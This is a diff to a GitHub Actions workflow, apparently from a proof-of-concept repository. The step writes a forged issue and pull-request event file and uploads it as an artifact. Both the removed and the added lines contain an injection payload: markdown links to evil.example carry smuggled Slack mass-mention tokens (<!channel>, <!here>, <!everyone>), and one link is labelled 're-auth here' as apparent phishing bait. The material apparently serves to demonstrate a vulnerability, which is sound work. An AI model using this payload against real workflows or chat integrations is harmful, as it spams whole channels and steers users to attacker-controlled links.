@@ -11,9 +11,8 @@ jobs:
     steps:
       - name: Stash forged event payload
         run: |
-          cat > event.json <<'JSON'
-          {"action":"opened","repository":{"name":"gab-poc"},"issue":{"number":4242,"title":"benign issue title","body":"Thanks for the help! See [our notes](https://evil.example><!channel>) for details.","labels":[],"user":{"login":"attacker"},"html_url":"https://github.com/PDFtoMark/gab-poc-gardener-wr/issues/4242"},"pull_request":{"number":4242,"title":"benign PR title","body":"[re-auth here](https://evil.example><!here>)","user":{"login":"attacker"},"html_url":"https://evil.example><!everyone>","changed_files":1,"additions":2,"deletions":3,"draft":false},"sender":{"login":"attacker"}}
-          JSON
+          printf '%s\n' '{"action":"opened","repository":{"name":"gab-poc"},"issue":{"number":4242,"title":"benign issue title","body":"Thanks for the help! See [our notes](https://evil.example><!channel>) for details.","labels":[],"user":{"login":"attacker"},"html_url":"https://github.com/PDFtoMark/gab-poc-gardener-wr/issues/4242"},"pull_request":{"number":4242,"title":"benign PR title","body":"[re-auth here](https://evil.example><!here>)","user":{"login":"attacker"},"html_url":"https://evil.example><!everyone>","changed_files":1,"additions":2,"deletions":3,"draft":false},"sender":{"login":"attacker"}}' > event.json
+          jq -e . event.json > /dev/null && echo "forged event.json written"
       - uses: actions/upload-artifact@v4
         with:
           name: gardener-event
